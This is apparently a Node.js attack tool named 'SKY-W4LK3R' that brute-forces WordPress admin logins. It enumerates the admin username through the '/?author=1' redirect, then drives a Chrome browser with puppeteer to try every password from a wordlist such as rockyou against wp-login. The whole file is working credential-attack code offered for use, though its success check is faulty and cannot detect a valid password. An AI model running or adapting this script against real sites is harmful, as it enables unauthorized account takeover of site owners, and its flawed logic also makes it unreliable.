const figlet = require('figlet');
const fs = require('fs');
const process = require('process');
const puppeteer = require('puppeteer');
const wp_login = process.argv[2] //Argument for your target
let   default_user = ['admin'];


figlet('SKY-W4LK3R', (err,result) => {
    console.log(err || result)
});



var request = require('request'); //This will try to detect the admin usernam if the default one is incorrect! byt using whos is the other number 1
var r = request.get(wp_login + '/?author=1', function (err, res, body) {

    let check = r.uri.href.split("/");
    check.pop();
    default_user.push(check.slice(-1).pop());
});




const passwordList = fs.readFileSync(process.argv[3], 'utf8').replace(/\r\n/g,'\n').split('\n'); //rockyou for example

async function run(wp_login) {    
    const browser = await puppeteer.launch({
        headless: false,
        defaultViewport: null,
        executablePath: 'C:/chrome-win/chrome.exe', //path for ur chromuim.exe
        args: ["--disable-notifications"]
    });
    const page = await browser.newPage();
    page.setDefaultNavigationTimeout(100000);
    await page.goto(wp_login + '/wp-login', {waitUntil: 'networkidle2', waitUntil: 'load'});

    const clear = async function ( selector) {
        await page.waitForSelector(selector);
        await this.evaluate(selector => {
          document.querySelector(selector).value = "";
        }, selector);
      };

    page.clear = clear;
    
    for (let i = 0; i < default_user.length; i++) {       
        for (let j = 0; j < passwordList.length; j++) {
            await page.clear('input[type="text"]')
            await page.type('input[type="text"]', default_user[i]);
            await page.clear('input[type="password"]');
            await page.type('input[type="password"]', passwordList[j]);
            const response = await page.click('#wp-submit');
 
            if(!response){
                console.log('Testing... ' + 'username: ' + default_user + '|' + 'password: ' + passwordList[j]);
                browser.close
                
            } else {
                console.log('No password found!');
                
            }
        }   
    }
}

run(wp_login)
